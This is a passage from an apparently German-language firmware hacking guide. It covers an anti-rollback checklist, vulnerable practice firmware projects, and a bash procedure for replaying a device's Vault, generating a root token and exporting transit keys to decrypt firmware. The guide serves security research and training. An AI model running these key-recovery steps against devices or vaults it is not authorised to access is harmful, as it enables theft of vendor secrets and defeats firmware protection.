* Ist der Transport/die Authentifizierung des *Update-Endpunkts* ausreichend geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen Anti-Rollback-Counter**?
* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. durch Signaturprüfung im ROM-Code)?
* Erzwingt der **Bootloader denselben Ratchet** wie der Updater, statt nur Signatur/CRC zu prüfen?
* Sind die Slot-Aktivierungsmetadaten an den **validierten Firmware-Digest/die Version gebunden**, oder kann ein Slot nach seiner Aktivierung verändert werden?
* Erzwingt das Gerät nach einem erfolgreichen Slot-Wechsel einen Reboot, oder sind spätere Update-/Löschroutinen weiterhin in derselben Session erreichbar?
* Führt der Userspace-Code zusätzliche Plausibilitätsprüfungen durch (z. B. zulässige Partitionszuordnung, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Flows dieselbe Validierungslogik wieder?

> 💡  Wenn einer der oben genannten Punkte fehlt, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Angreifbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, können die folgenden angreifbaren Firmware-Projekte als Ausgangspunkt verwendet werden.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Wiederherstellung von Firmware-Entschlüsselungsschlüsseln aus eingebettetem KMS-/Vault-Zustand

Wenn ein Update-Image kleine Klartext-Metadaten mit einem großen Blob hoher Entropie vermischt, sollte vor jeglichem Brute-Forcing zunächst eine Container-Triage durchgeführt werden:<sup>[[1]](#references)</sup>

- Header, Offsets und Zeilengrenzen mit `hexdump`, `xxd`, `strings -tx`, `base64 -d` und `binwalk -E` ausgeben.
- `Salted__` bedeutet normalerweise das OpenSSL-`enc`-Format: Die nächsten 8 Bytes sind der Salt, die verbleibenden Bytes der Ciphertext.
- Ein Base64-Feld, das zu genau `256` Bytes decodiert wird, ist ein starker Hinweis darauf, dass es sich um einen RSA-2048-Ciphertext handelt, der ein zufälliges Firmware-Passwort/einen zufälligen Session-Key umschließt.
- Separates PGP-Material in derselben Datei schützt häufig nur die Authentizität; es sollte nicht angenommen werden, dass es als Vertraulichkeitsmechanismus dient.

Wenn die statische Schlüsselsuche (`grep`, `strings`, PEM-/PGP-Suchen) erfolglos bleibt, sollte stattdessen der **operative Entschlüsselungspfad** analysiert werden, anstatt nur nach privaten Schlüsseln zu suchen:

- Den Updater / das Management-Binary dekompilieren und nachverfolgen, wer den verschlüsselten Blob liest, welcher Helper/welche API ihn entpackt und welchen logischen Schlüsselnamen sie anfordert.
- Im extrahierten Root-Dateisystem nach KMS-Zuständen (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) sowie nach Unit-Dateien und Init-Skripten suchen.
- Klartextbefehle wie `vault operator unseal ...`, Recovery-Keys, Bootstrap-Tokens oder lokale KMS-Auto-Unseal-Skripte als gleichwertig zu Private-Key-Material behandeln.

Wenn das Gerät das originale Vault-Binary und das Storage-Backend mitliefert, ist das Replay dieser Umgebung normalerweise einfacher, als die internen Vault-Funktionen neu zu implementieren:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Mit root auf dem geklonten KMS:

- Mache transit keys nur innerhalb des isolierten Klons exportierbar: `vault write transit/keys/<name>/config exportable=true`
- Exportiere den Unwrap-Schlüssel: `vault read transit/export/encryption-key/<name>`
- Teste den wiederhergestellten RSA-Schlüssel mit dem exakten Padding-/Hash-Paar, das vom KMS verwendet wird. Eine fehlgeschlagene PKCS#1-v1.5-Entschlüsselung und eine fehlgeschlagene Standard-OAEP-Entschlüsselung **beweisen nicht**, dass der Schlüssel falsch ist; viele Vault-basierte Flows verwenden OAEP mit SHA-256, während gängige Bibliotheken standardmäßig SHA-1 nutzen.
- Wenn das Payload mit `Salted__` beginnt, reproduziere exakt die OpenSSL-KDF des Anbieters (`EVP_BytesToKey`, bei älteren Appliances häufig MD5), bevor du eine AES-CBC-Entschlüsselung versuchst.

Damit wird „verschlüsselte Firmware“ zu einem allgemeineren Problem: **Stelle die appliance-seitigen Betriebsschlüssel wieder her und reproduziere anschließend offline exakt die Unwrap- und KDF-Parameter**.

## Schulungen und Zertifizierungen

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware mit Claude knacken: Skill auf Senior-Niveau, Autonomie auf Junior-Niveau](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodik zum Testen der Firmware-Sicherheit](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktisches IoT-Hacking: Der definitive Leitfaden zum Angriff auf das Internet der Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Zero-Days in veralteter Hardware ausnutzen – Trail of Bits-Blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Wie mir ein 20-Dollar-Smartgerät Zugriff auf Ihr Zuhause verschaffte](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Jetzt siehst du mich: Jetzt bist du Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Den Tesla Wall Connector über seinen Ladeanschluss ausnutzen – Teil 2: Umgehung des Anti-Downgrade-Schutzes](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Bring es zum Blinken: Over-the-Air-Exploitation der Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
